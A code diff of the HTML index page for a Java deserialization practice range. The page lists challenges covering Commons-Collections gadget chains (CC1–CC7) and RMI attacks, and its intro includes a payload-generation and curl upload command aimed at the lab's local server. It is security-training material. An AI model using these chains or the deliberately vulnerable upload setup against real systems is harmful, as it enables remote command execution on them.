@@ -1,851 +1,785 @@
 <!DOCTYPE html>
 <html lang="zh-cn">
 <head>
-  <!--头部信息-->
   <meta charset="utf-8"/>
-  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
-  <title>重庆橙子科技java反序列化靶场</title>
+  <title>重庆橙子科技Java反序列化靶场</title>
   <meta name="keywords" content="Java反序列化漏洞学习,网络安全,安全靶场"/>
-  <meta name="description" content="重庆橙子科技JAVA靶场导航中心，提供安全学习资源与靶场入口"/>
-
-  <!--外部资源-->
-  <link href="https://cdnjs.cloudflare.com/ajax/libs/zui/1.8.1/css/zui.min.css" rel="stylesheet" type="text/css"/>
+  <meta name="description" content="重庆橙子科技JAVA靶场，Java反序列化漏洞学习平台"/>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-
-  <style type="text/css">
-    /* 基础样式优化 */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
+  <style>
+    /* ========== Reset & Base ========== */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body { height: 100%; }
     body {
-      font-family: "Helvetica Neue", Arial, sans-serif;
-      background-color: #f5f7fa;
+      font-family: "Segoe UI", "PingFang SC", "Microsoft YaHei", sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
       color: #333;
-      line-height: 1.6;
-      padding-top: 70px; /* 为固定导航栏预留空间 */
-    }
-
-    /* 导航栏样式 */
-    .navbar {
-      background-color: #2c3e50;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-      position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
-      z-index: 1000;
-    }
-
-    .navbar-container {
-      max-width: 1200px;
-      margin: 0 auto;
-      padding: 0 20px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-
-    .navbar-brand {
-      color: #ecf0f1;
-      font-size: 1.5rem;
-      font-weight: bold;
-      padding: 15px 0;
-      display: inline-block;
-      text-decoration: none;
-    }
-
-    .navbar-nav {
-      display: flex;
-      list-style: none;
-      margin-bottom: 0;
-    }
-
-    .nav-item {
-      margin-left: 20px;
-    }
-
-    .nav-link {
-      color: #bdc3c7;
-      text-decoration: none;
-      padding: 15px 0;
-      display: block;
-      transition: color 0.3s;
-    }
-
-    .nav-link:hover {
-      color: #ffffff;
-      text-decoration: none;
-    }
-
-    .nav-link.active {
-      color: #ffffff;
-      border-bottom: 2px solid #3498db;
-    }
-
-    /* 主容器样式 */
-    .container {
-      max-width: 1200px;
-      margin: 0 auto;
-      padding: 30px 20px;
-    }
-
-    /* 导航卡片样式 */
-    .nav-cards {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-      gap: 25px;
-      margin-top: 30px;
-    }
-
-    .nav-card {
-      background-color: #ffffff;
-      border-radius: 8px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
-      padding: 25px;
-      transition: transform 0.3s, box-shadow 0.3s;
-    }
-
-    .nav-card:hover {
-      transform: translateY(-5px);
-      box-shadow: 0 8px 20px rgba(0,0,0,0.12);
-    }
-
-    .card-icon {
-      font-size: 2.5rem;
-      color: #3498db;
-      margin-bottom: 15px;
-    }
-
-    .card-title {
-      font-size: 1.25rem;
-      margin-bottom: 10px;
-      color: #2c3e50;
-    }
-
-    .card-desc {
-      color: #7f8c8d;
-      margin-bottom: 20px;
-      font-size: 0.95rem;
-    }
-
-    .card-link {
-      display: inline-block;
-      color: #3498db;
-      text-decoration: none;
-      font-weight: 500;
-      transition: color 0.3s;
-    }
-
-    .card-link:hover {
-      color: #2980b9;
-      text-decoration: none;
-    }
-
-    /* 响应式设计 */
-    @media (max-width: 768px) {
-      .navbar-nav {
-        flex-direction: column;
-        padding: 10px 0;
-      }
-
-      .nav-item {
-        margin: 5px 0;
-      }
-
-      .nav-cards {
-        grid-template-columns: 1fr;
-      }
-
-      body {
-        padding-top: 120px;
-      }
-
-      .footer-links {
-        flex-direction: column;
-        gap: 10px;
-      }
-    }
-
-    /* 优化后的页脚样式 */
-    footer {
-      background-color: #2c3e50;
-      color: #ecf0f1;
-      padding: 40px 0 20px;
-      margin-top: 80px;
-      position: relative;
       overflow: hidden;
     }
+    a { text-decoration: none; color: inherit; }
 
-    /* 增加装饰性波浪分隔线 */
-    footer::before {
-      content: "";
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      height: 10px;
-      background: linear-gradient(45deg, transparent 33.333%, #3498db 33.333%, #3498db 66.667%, transparent 66.667%),
-      linear-gradient(-45deg, transparent 33.333%, #3498db 33.333%, #3498db 66.667%, transparent 66.667%);
-      background-size: 20px 20px;
+    /* ========== Top Navbar ========== */
+    .top-nav {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 1000;
+      height: 56px;
+      background: linear-gradient(135deg, rgba(102,126,234,0.96) 0%, rgba(118,75,162,0.98) 100%);
+      backdrop-filter: blur(10px);
+      display: flex; align-items: center;
+      padding: 0 16px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.15);
+      border-bottom: 1px solid rgba(255,255,255,0.10);
+    }
+    .nav-brand {
+      color: #fff; font-size: 1.25rem; font-weight: 700;
+      display: flex; align-items: center; gap: 10px;
+      text-shadow: 0 1px 4px rgba(0,0,0,0.2);
+    }
+    .nav-brand i { color: rgba(255,255,255,0.9); }
+    .nav-toggle {
+      display: none; background: none; border: none; color: #fff;
+      font-size: 1.4rem; cursor: pointer; padding: 4px 8px;
+      margin-right: 12px;
+    }
+    .nav-links {
+      margin-left: auto; display: flex; gap: 4px; list-style: none;
+    }
+    .nav-links a {
+      color: rgba(255,255,255,0.6); padding: 6px 14px; border-radius: 6px;
+      transition: all 0.2s; font-size: 0.88rem;
+    }
+    .nav-links a:hover { color: #fff; background: rgba(255,255,255,0.12); }
+
+    /* ========== Layout ========== */
+    .layout {
+      display: flex; margin-top: 56px; height: calc(100vh - 56px);
     }
 
-    .footer-content {
-      max-width: 1200px;
-      margin: 0 auto;
-      padding: 0 20px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      text-align: center;
+    /* ========== Sidebar ========== */
+    .sidebar {
+      width: 230px; min-width: 230px;
+      background: linear-gradient(180deg, rgba(102,126,234,0.88) 0%, rgba(118,75,162,0.94) 100%);
+      backdrop-filter: blur(14px);
+      border-right: 1px solid rgba(255,255,255,0.08);
+      overflow-y: auto; overflow-x: hidden;
+      transition: margin-left 0.3s ease;
+      display: flex; flex-direction: column;
+    }
+    .sidebar::-webkit-scrollbar { width: 3px; }
+    .sidebar::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.15); border-radius: 2px; }
+
+    .sidebar-header {
+      padding: 16px 18px 8px;
+      font-size: 0.7rem; font-weight: 600;
+      text-transform: uppercase; letter-spacing: 1.5px;
+      color: rgba(255,255,255,0.35); cursor: default;
     }
 
-    .footer-logo {
-      font-size: 1.8rem;
-      margin-bottom: 15px;
-      color: #ffffff;
-      display: flex;
-      align-items: center;
-      gap: 10px;
+    .sidebar-divider {
+      padding: 14px 18px 4px;
+      font-size: 0.65rem; font-weight: 600;
+      text-transform: uppercase; letter-spacing: 1.5px;
+      color: rgba(255,255,255,0.30); cursor: default;
     }
 
-    .footer-links {
-      display: flex;
-      gap: 20px;
-      margin: 20px 0;
-      flex-wrap: wrap;
-      justify-content: center;
+    .sidebar-item {
+      display: flex; align-items: center; gap: 10px;
+      padding: 8px 18px; cursor: pointer;
+      color: rgba(255,255,255,0.6);
+      font-size: 0.82rem;
+      transition: all 0.2s;
+      border-left: 3px solid transparent;
+      user-select: none;
+    }
+    .sidebar-item:hover { background: rgba(255,255,255,0.08); color: #fff; }
+    .sidebar-item.active {
+      background: rgba(255,255,255,0.12); color: #fff;
+      border-left-color: rgba(255,255,255,0.7);
+    }
+    .sidebar-item .badge {
+      display: inline-flex; align-items: center; justify-content: center;
+      width: 22px; height: 22px; border-radius: 4px;
+      background: rgba(255,255,255,0.10);
+      color: rgba(255,255,255,0.6);
+      font-size: 0.62rem; font-weight: 700;
+      flex-shrink: 0;
+    }
+    .sidebar-item.active .badge {
+      background: rgba(255,255,255,0.20); color: #fff;
+    }
+    .sidebar-item i {
+      width: 16px; text-align: center; flex-shrink: 0;
     }
 
-    .footer-links a {
-      color: #bdc3c7;
-      text-decoration: none;
-      transition: color 0.3s;
-      padding: 5px 10px;
-      border-radius: 4px;
+    .sidebar-footer {
+      margin-top: auto; padding: 12px 18px;
+      border-top: 1px solid rgba(255,255,255,0.06);
+      font-size: 0.7rem; color: rgba(255,255,255,0.30); text-align: center;
     }
 
-    .footer-links a:hover {
-      color: #ffffff;
-      background-color: rgba(255, 255, 255, 0.1);
+    /* ========== Main Content Area ========== */
+    .main-content {
+      flex: 1; overflow: hidden;
+      display: flex; flex-direction: column;
     }
 
-    .footer-copyright {
-      margin-top: 20px;
-      padding-top: 20px;
-      border-top: 1px solid rgba(255, 255, 255, 0.1);
-      font-size: 0.9rem;
-      color: #bdc3c7;
+    /* ===== Intro page (inline) ===== */
+    #intro-page {
+      overflow-y: auto; flex: 1; padding: 28px 36px;
+    }
+    #intro-page::-webkit-scrollbar { width: 5px; }
+    #intro-page::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.20); border-radius: 3px; }
+
+    .intro-header {
+      text-align: center; padding: 36px 0 24px;
+    }
+    .intro-header h1 {
+      font-size: 1.9rem; color: #fff; margin-bottom: 10px;
+      text-shadow: 0 2px 8px rgba(0,0,0,0.15);
+    }
+    .intro-header h1 i { margin-right: 10px; }
+    .intro-header p {
+      color: rgba(255,255,255,0.7); font-size: 0.95rem;
+      max-width: 600px; margin: 0 auto;
     }
 
-    /* 模态框样式 */
-    .modal-overlay {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      background-color: rgba(0, 0, 0, 0.6);
-      z-index: 2000;
+    .intro-section {
+      background: rgba(255, 255, 255, 0.92);
+      backdrop-filter: blur(10px);
+      border-radius: 14px; padding: 24px 28px;
+      margin-bottom: 20px;
+      border: 1px solid rgba(255,255,255,0.25);
+      box-shadow: 0 4px 16px rgba(0,0,0,0.06);
+    }
+    .intro-section h2 {
+      font-size: 1.1rem; color: #2c3e50; margin-bottom: 14px;
+      display: flex; align-items: center; gap: 10px;
+    }
+    .intro-section h2 i { color: #667eea; }
+    .intro-section p, .intro-section li {
+      color: #555; line-height: 1.8; font-size: 0.92rem;
+    }
+    .intro-section ul { padding-left: 20px; }
+    .intro-section code {
+      background: #f0f2f5; padding: 2px 8px; border-radius: 4px;
+      font-size: 0.85rem; color: #e74c3c;
+    }
+    .intro-section .cmd-block {
+      background: #1a1a2e; color: #e0e0e0; padding: 14px 18px;
+      border-radius: 8px; font-family: 'Courier New', monospace;
+      font-size: 0.85rem; margin: 12px 0; overflow-x: auto;
+      border: 1px solid rgba(255,255,255,0.08);
+    }
+    .intro-section .cmd-block .comment { color: #7f8c8d; }
+    .intro-section .cmd-block .highlight { color: #f1c40f; }
+    .intro-highlight {
+      background: rgba(255, 248, 225, 0.92);
+      border-left: 4px solid #f39c12;
     }
 
-    .modal-overlay.show {
-      display: block;
+    .challenge-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(210px, 1fr));
+      gap: 10px; margin-top: 14px;
     }
-
-    .modal-overlay.show .modal-content {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      margin: 0;
-    }
-
-    .modal-content {
-      background-color: #ffffff;
-      border-radius: 12px;
-      max-width: 700px;
-      width: 90%;
-      max-height: 85vh;
-      overflow-y: auto;
-      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-      animation: modalSlideIn 0.3s ease;
-    }
-
-    @keyframes modalSlideIn {
-      from {
-        opacity: 0;
-        transform: translateY(-30px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    .modal-header {
-      background: linear-gradient(135deg, #3498db, #2c3e50);
-      color: #ffffff;
-      padding: 20px 25px;
-      border-radius: 12px 12px 0 0;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-
-    .modal-header h2 {
-      margin: 0;
-      font-size: 1.5rem;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-
-    .modal-close {
-      background: none;
-      border: none;
-      color: #ffffff;
-      font-size: 1.8rem;
+    .challenge-card {
+      background: rgba(248, 249, 255, 0.8);
+      border-radius: 8px; padding: 12px 14px;
+      border: 1px solid rgba(102,126,234,0.15);
       cursor: pointer;
-      padding: 5px;
-      line-height: 1;
-      transition: opacity 0.3s;
+      transition: all 0.2s; display: flex; align-items: center; gap: 12px;
+    }
+    .challenge-card:hover {
+      border-color: #667eea; background: rgba(255,255,255,0.95);
+      transform: translateY(-1px);
+      box-shadow: 0 4px 12px rgba(102,126,234,0.15);
+    }
+    .challenge-card .num {
+      width: 28px; height: 28px; border-radius: 6px;
+      background: rgba(102,126,234,0.12); color: #667eea;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 0.7rem; font-weight: 700; flex-shrink: 0;
+    }
+    .challenge-card .info { flex: 1; min-width: 0; }
+    .challenge-card .name {
+      font-weight: 600; font-size: 0.85rem; color: #2c3e50;
+    }
+    .challenge-card .desc {
+      font-size: 0.75rem; color: #95a5a6; margin-top: 2px;
     }
 
-    .modal-close:hover {
-      opacity: 0.7;
+    .intro-footer {
+      text-align: center; padding: 24px 0 32px;
+      color: rgba(255,255,255,0.45); font-size: 0.8rem;
+    }
+    .intro-footer a { color: rgba(255,255,255,0.6); }
+    .intro-footer a:hover { color: #fff; }
+
+    /* ===== Iframe Container ===== */
+    #frame-container {
+      display: none; flex: 1; overflow: hidden;
+    }
+    #content-frame {
+      width: 100%; height: 100%; border: none;
     }
 
-    .modal-body {
-      padding: 25px;
+    /* ========== RMI Modal ========== */
+    .modal-overlay {
+      display: none; position: fixed; top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: rgba(0,0,0,0.55); z-index: 2000;
+      justify-content: center; align-items: center;
     }
-
+    .modal-overlay.show { display: flex; }
+    .modal-content {
+      background: rgba(255,255,255,0.97); border-radius: 14px;
+      max-width: 720px; width: 92%; max-height: 85vh; overflow-y: auto;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.25);
+      animation: modalIn 0.25s ease;
+    }
+    @keyframes modalIn {
+      from { opacity: 0; transform: translateY(-20px) scale(0.97); }
+      to { opacity: 1; transform: translateY(0) scale(1); }
+    }
+    .modal-header {
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      color: #fff; padding: 18px 24px;
+      border-radius: 14px 14px 0 0;
+      display: flex; justify-content: space-between; align-items: center;
+    }
+    .modal-header h2 { font-size: 1.15rem; display: flex; align-items: center; gap: 10px; }
+    .modal-close {
+      background: none; border: none; color: #fff; font-size: 1.8rem;
+      cursor: pointer; line-height: 1; opacity: 0.7; transition: opacity 0.2s;
+    }
+    .modal-close:hover { opacity: 1; }
+    .modal-body { padding: 24px; }
     .modal-body h3 {
-      color: #2c3e50;
-      margin-top: 20px;
-      margin-bottom: 15px;
-      font-size: 1.2rem;
-      border-left: 4px solid #3498db;
-      padding-left: 12px;
+      color: #2c3e50; margin: 20px 0 12px; font-size: 1rem;
+      border-left: 4px solid #667eea; padding-left: 12px;
     }
+    .modal-body h3:first-child { margin-top: 0; }
 
-    .modal-body h3:first-child {
-      margin-top: 0;
-    }
-
-    .port-table {
-      width: 100%;
-      border-collapse: collapse;
-      margin: 15px 0;
-      font-size: 0.95rem;
-    }
-
-    .port-table th,
-    .port-table td {
-      padding: 12px 15px;
-      text-align: left;
-      border-bottom: 1px solid #ecf0f1;
-    }
-
-    .port-table th {
-      background-color: #f8f9fa;
-      color: #2c3e50;
-      font-weight: 600;
-    }
-
-    .port-table tr:hover {
-      background-color: #f8f9fa;
-    }
-
-    .port-badge {
-      display: inline-block;
-      background-color: #3498db;
-      color: #ffffff;
-      padding: 4px 12px;
-      border-radius: 20px;
-      font-weight: 600;
-      font-family: monospace;
-    }
-
-    .port-badge.danger {
-      background-color: #e74c3c;
-    }
-
-    .port-badge.success {
-      background-color: #27ae60;
-    }
-
-    .port-badge.warning {
-      background-color: #f39c12;
-    }
-
-    .attack-demo {
-      background-color: #f8f9fa;
-      border-radius: 8px;
-      padding: 15px;
-      margin: 15px 0;
-      border-left: 4px solid #e74c3c;
-    }
-
-    .attack-demo code {
-      display: block;
-      background-color: #2c3e50;
-      color: #ecf0f1;
-      padding: 12px;
-      border-radius: 6px;
-      margin-top: 10px;
-      font-family: 'Courier New', monospace;
-      font-size: 0.9rem;
-      overflow-x: auto;
-    }
-
-    .warning-box {
-      background-color: #fff3cd;
-      border: 1px solid #ffc107;
-      border-radius: 8px;
-      padding: 15px;
-      margin: 15px 0;
-    }
-
-    .warning-box strong {
-      color: #856404;
-    }
-
-    /* RMI实验卡片样式 */
     .exp-card {
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-      border-radius: 10px;
-      padding: 20px;
-      margin: 15px 0;
-      color: #fff;
+      padding: 16px 20px; border-radius: 10px; margin: 12px 0; color: #fff;
     }
-
-    .exp-card.danger {
-      background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
-    }
-
-    .exp-card.success {
-      background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
-    }
-
-    .exp-card.warning {
-      background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
-      color: #333;
-    }
-
+    .exp-card.danger { background: linear-gradient(135deg, #e74c3c, #c0392b); }
+    .exp-card.success { background: linear-gradient(135deg, #27ae60, #1e8449); }
+    .exp-card.warning { background: linear-gradient(135deg, #f39c12, #d4a017); color: #333; }
+    .exp-card.info { background: linear-gradient(135deg, #667eea, #764ba2); }
     .exp-card-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 12px;
+      display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;
     }
-
-    .exp-card-title {
-      font-size: 1.2rem;
-      font-weight: bold;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-
+    .exp-card-title { font-size: 1rem; font-weight: bold; display: flex; align-items: center; gap: 8px; }
     .exp-card-port {
-      background: rgba(255,255,255,0.3);
-      padding: 5px 15px;
-      border-radius: 20px;
-      font-family: monospace;
-      font-weight: bold;
+      background: rgba(255,255,255,0.25); padding: 3px 12px; border-radius: 20px;
+      font-family: monospace; font-size: 0.82rem;
     }
-
-    .exp-card-desc {
-      font-size: 0.95rem;
-      margin-bottom: 12px;
-      opacity: 0.95;
-    }
-
+    .exp-card-desc { font-size: 0.88rem; margin-bottom: 10px; opacity: 0.95; }
     .exp-card-code {
-      background: rgba(0,0,0,0.3);
-      border-radius: 6px;
-      padding: 10px;
-      font-family: 'Courier New', monospace;
-      font-size: 0.85rem;
-      overflow-x: auto;
+      background: rgba(0,0,0,0.3); border-radius: 6px; padding: 10px 14px;
+      font-family: 'Courier New', monospace; font-size: 0.82rem; overflow-x: auto;
+    }
+    .warning-box {
+      background: #fff3cd; border: 1px solid #ffc107; border-radius: 8px;
+      padding: 14px 18px; margin: 16px 0; font-size: 0.88rem; color: #856404;
     }
 
-    .exp-card-effect {
-      margin-top: 10px;
-      font-size: 0.9rem;
+    /* ========== Mobile Responsive ========== */
+    @media (max-width: 768px) {
+      .sidebar {
+        position: fixed; top: 56px; left: 0; bottom: 0; z-index: 999;
+        margin-left: -230px;
+        box-shadow: 4px 0 16px rgba(0,0,0,0.15);
+      }
+      .sidebar.open { margin-left: 0; }
+      .nav-toggle { display: block; }
+      .nav-brand span { display: none; }
+      .nav-links a { padding: 6px 10px; font-size: 0.8rem; }
+      #intro-page { padding: 20px 16px; }
+      .intro-header h1 { font-size: 1.4rem; }
+      .intro-section { padding: 18px; }
+      .challenge-grid { grid-template-columns: 1fr; }
+
+      .sidebar-overlay {
+        display: none; position: fixed; inset: 0; z-index: 998;
+        background: rgba(0,0,0,0.35);
+      }
+      .sidebar-overlay.show { display: block; }
     }
   </style>
 </head>
 <body>
-<!-- 导航栏 -->
-<nav class="navbar">
-  <div class="navbar-container">
-    <a href="#" class="navbar-brand">
-      <i class="fas fa-shield-alt"></i> 橙子科技靶场
-    </a>
-    <ul class="navbar-nav">
-      <li class="nav-item">
-        <a href="#" class="nav-link active">首页</a>
-      </li>
-      <li class="nav-item">
-        <a href="https://space.bilibili.com/271803648" class="nav-link">学习资源</a>
-      </li>
-      <li class="nav-item">
-        <a href="#" class="nav-link">关于我们</a>
-      </li>
-    </ul>
-  </div>
+
+<!-- ========== TOP NAVBAR ========== -->
+<nav class="top-nav">
+  <button class="nav-toggle" id="navToggle" aria-label="切换侧边栏">
+    <i class="fas fa-bars"></i>
+  </button>
+  <a class="nav-brand" href="#intro">
+    <i class="fas fa-shield-alt"></i>
+    <span>橙子科技靶场</span>
+  </a>
+  <ul class="nav-links">
+    <li><a href="https://space.bilibili.com/271803648" target="_blank"><i class="fas fa-graduation-cap"></i> 学习资源</a></li>
+    <li><a href="https://github.com/bit4woo/Java_Deserialization_Lab" target="_blank"><i class="fab fa-github"></i> 项目源码</a></li>
+  </ul>
 </nav>
 
-<!-- 主内容区 -->
-<div class="container">
-  <h1>安全学习导航中心</h1>
-  <p class="text-muted">专注于JAVA漏洞与反序列化漏洞学习资源导航</p>
+<!-- ========== SIDEBAR OVERLAY (mobile) ========== -->
+<div class="sidebar-overlay" id="sidebarOverlay"></div>
 
-  <div class="nav-cards">
-    <!-- 导航卡片1 -->
-    <div class="nav-card">
-      <div class="card-icon">
-        <i class="fas fa-crosshairs"></i>
+<!-- ========== LAYOUT ========== -->
+<div class="layout">
+
+  <!-- ===== SIDEBAR ===== -->
+  <aside class="sidebar" id="sidebar">
+
+    <div class="sidebar-header">导航</div>
+
+    <a class="sidebar-item active" data-target="intro">
+      <i class="fas fa-home" style="color:rgba(255,255,255,0.7);"></i> 靶场介绍
+    </a>
+
+    <div class="sidebar-divider">基础篇</div>
+
+    <a class="sidebar-item" data-path="/class01/">
+      <span class="badge">01</span> 命令执行
+    </a>
+    <a class="sidebar-item" data-path="/class02/">
+      <span class="badge">02</span> 反序列化基础
+    </a>
+    <a class="sidebar-item" data-path="/class03/">
+      <span class="badge">03</span> 反序列化命令执行
+    </a>
+    <a class="sidebar-item" data-path="/class04/">
+      <span class="badge">04</span> UnserReadObj
+    </a>
+    <a class="sidebar-item" data-path="/class05/">
+      <span class="badge">05</span> 反射版readObject
+    </a>
+    <a class="sidebar-item" data-path="/class06/">
+      <span class="badge">06</span> Javassist字节码注入
+    </a>
+
+    <div class="sidebar-divider">Commons-Collections 组件</div>
+
+    <a class="sidebar-item" data-path="/class07/">
+      <span class="badge">07</span> InvokerTransformer
+    </a>
+    <a class="sidebar-item" data-path="/class08/">
+      <span class="badge">08</span> ConstantTransformer
+    </a>
+    <a class="sidebar-item" data-path="/class09/">
+      <span class="badge">09</span> ChainedTransformer
+    </a>
+    <a class="sidebar-item" data-path="/class10/">
+      <span class="badge">10</span> LazyMap
+    </a>
+    <a class="sidebar-item" data-path="/class11/">
+      <span class="badge">11</span> InstantiateTransformer
+    </a>
+    <a class="sidebar-item" data-path="/class12/">
+      <span class="badge">12</span> TemplatesImpl
+    </a>
+    <a class="sidebar-item" data-path="/class13/">
+      <span class="badge">13</span> TransformedMap
+    </a>
+
+    <div class="sidebar-divider">完整利用链</div>
+
+    <a class="sidebar-item" data-path="/class14/">
+      <span class="badge">14</span> CC1 链
+    </a>
+    <a class="sidebar-item" data-path="/class15/">
+      <span class="badge">15</span> CC2 链
+    </a>
+    <a class="sidebar-item" data-path="/class16/">
+      <span class="badge">16</span> CC3 链
+    </a>
+    <a class="sidebar-item" data-path="/class17/">
+      <span class="badge">17</span> CC4 链
+    </a>
+    <a class="sidebar-item" data-path="/class18/">
+      <span class="badge">18</span> CC5 链
+    </a>
+    <a class="sidebar-item" data-path="/class19/">
+      <span class="badge">19</span> CC6 链
+    </a>
+    <a class="sidebar-item" data-path="/class20/">
+      <span class="badge">20</span> CC7 链
+    </a>
+
+    <div class="sidebar-divider">进阶实验</div>
+
+    <a class="sidebar-item" id="rmiTrigger">
+      <i class="fas fa-network-wired" style="color:rgba(255,255,255,0.5);"></i> RMI 反序列化实验
+    </a>
+
+    <div class="sidebar-footer">
+      Orange Technology Lab &copy; 2025
+    </div>
+  </aside>
+
+  <!-- ===== MAIN CONTENT ===== -->
+  <main class="main-content">
+
+    <!-- ===== INTRO PAGE (default) ===== -->
+    <div id="intro-page">
+
+      <div class="intro-header">
+        <h1><i class="fas fa-shield-alt"></i>Java 反序列化漏洞靶场</h1>
+        <p>从原理到实战，系统化学习 Java 反序列化漏洞的触发机制与利用链构造</p>
       </div>
-      <h3 class="card-title">命令执行</h3>
-      <p class="card-desc">java Runtime命令执行学习</p>
-      <a href="/class01" class="card-link">进入靶场 <i class="fas fa-arrow-right"></i></a>
-    </div>
 
-    <!-- 反序列化演示 -->
-    <div class="nav-card">
-      <div class="card-icon">
-        <i class="fas fa-code-branch"></i>
+      <div class="intro-section">
+        <h2><i class="fas fa-info-circle"></i> 关于靶场</h2>
+        <p>
+          本靶场包含 <strong>18 道</strong>渐进式题目，从最基础的 <code>Runtime.exec()</code> 命令执行，
+          到 Commons-Collections 各组件的拆解学习，再到完整的 CC1-CC7 利用链实战。
+          每道题都可在线上传序列化 payload，服务端反序列化后触发预设命令执行。
+        </p>
       </div>
-      <h3 class="card-title">反序列化</h3>
-      <p class="card-desc">Java反序列化文件</p>
-      <a href="/class02" class="card-link">进入靶场 <i class="fas fa-arrow-right"></i></a>
-    </div>
 
-    <!-- 导航卡片2 -->
-    <div class="nav-card">
-      <div class="card-icon">
-        <i class="fas fa-code-branch"></i>
+      <div class="intro-section">
+        <h2><i class="fas fa-road"></i> 学习路径</h2>
+        <ul>
+          <li><strong>基础篇</strong>（class01-04）：理解 Java 反序列化基本原理，认识 <code>readObject()</code>、<code>toString()</code> 等触发点</li>
+          <li><strong>组件篇</strong>（class07-13）：逐一拆解 Commons-Collections 的 Transformer 组件，掌握每个类的调用逻辑</li>
+          <li><strong>利用链篇</strong>（class14-20）：组合组件构造完整的 CC1-CC7 利用链，理解 ysoserial 的攻击原理</li>
+          <li><strong>进阶实验</strong>：RMI 反序列化攻击场景</li>
+        </ul>
       </div>
-      <h3 class="card-title">反序列化命令执行</h3>
-      <p class="card-desc">Java反序列化触发命令执行学习</p>
-      <a href="/class03" class="card-link">进入靶场 <i class="fas fa-arrow-right"></i></a>
-    </div>
 
-    <!-- Class04UnserReadObj -->
-    <div class="nav-card">
-      <div class="card-icon">
-        <i class="fas fa-code"></i>
+      <div class="intro-section">
+        <h2><i class="fas fa-play-circle"></i> 使用方法</h2>
+        <p>使用 Java 生成序列化 payload（.ser 文件），通过 curl 上传到对应题目：</p>
+        <div class="cmd-block">
+          <span class="comment"># 1. 生成 payload（在 poc/ 目录下）</span><br>
+          cd poc/class07-invoker/ && bash gen.sh<br><br>
+          <span class="comment"># 2. 上传 .ser 文件到靶场</span><br>
+          curl -F "uploadFile=@class07.ser" http://localhost:81/class07/upload
+        </div>
+        <p>或将 .ser 文件通过网页端的 <strong>"选择文件"</strong> 按钮上传。</p>
       </div>
-      <h3 class="card-title">UnserReadObj</h3>
-      <p class="card-desc">深入理解ObjectInputStream.readObject()的反序列化核心流程。</p>
-      <a href="/class04" class="card-link">进入靶场 <i class="fas fa-arrow-right"></i></a>
-    </div>
 
-    <!-- RMI 综合实验 -->
-    <div class="nav-card">
-      <div class="card-icon">
-        <i class="fas fa-network-wired"></i>
+      <div class="intro-section intro-highlight">
+        <h2><i class="fas fa-exclamation-triangle" style="color:#f39c12;"></i> 注意事项</h2>
+        <ul>
+          <li>本环境仅用于授权安全学习，请勿用于非法用途</li>
+          <li>JDK 版本为 8u402，CC1/CC3 链因 <code>AnnotationInvocationHandler</code> 修复已失效</li>
+          <li>CC5 链需要 JDK 8 环境生成 payload（已提供 Docker 内生成脚本）</li>
+          <li>使用 TemplatesImpl 的题目需启用 <code>jdk.xml.enableTemplatesImplDeserialization=true</code></li>
+        </ul>
       </div>
-      <h3 class="card-title">RMI 反序列化实验</h3>
-      <p class="card-desc">RMI服务端攻击、客户端攻击、注册表绑定漏洞等多种攻击场景。</p>
-      <a href="javascript:void(0);" class="card-link" onclick="showRMIModal()">查看实验详情 <i class="fas fa-info-circle"></i></a>
-    </div>
 
-    <!-- Class07_Invoker -->
-    <div class="nav-card">
-      <div class="card-icon">
-        <i class="fas fa-cogs"></i>
+      <div class="intro-section">
+        <h2><i class="fas fa-list"></i> 全部题目</h2>
+        <div class="challenge-grid" id="challengeGrid">
+          <!-- 由 JS 动态生成 -->
+        </div>
       </div>
-      <h3 class="card-title">InvokerTransformer</h3>
-      <p class="card-desc">掌握InvokerTransformer在反序列化链中的调用逻辑。</p>
-      <a href="/class07" class="card-link">进入靶场 <i class="fas fa-arrow-right"></i></a>
-    </div>
 
-    <!-- Class08_Constant -->
-    <div class="nav-card">
-      <div class="card-icon">
-        <i class="fas fa-shield-alt"></i>
+      <div class="intro-footer">
+        <p>重庆橙子科技 · Java 反序列化漏洞学习靶场</p>
+        <p style="margin-top:6px;">
+          <a href="https://space.bilibili.com/271803648" target="_blank">B站学习空间</a>
+          &middot; 问题反馈 &middot; 交流学习
+        </p>
       </div>
-      <h3 class="card-title">ConstantTransformer</h3>
-      <p class="card-desc">学习ConstantTransformer的常量传递与基础利用方式。</p>
-      <a href="/class08" class="card-link">进入靶场 <i class="fas fa-arrow-right"></i></a>
     </div>
 
-    <!-- Class09_ChainedTransformer -->
-    <div class="nav-card">
-      <div class="card-icon">
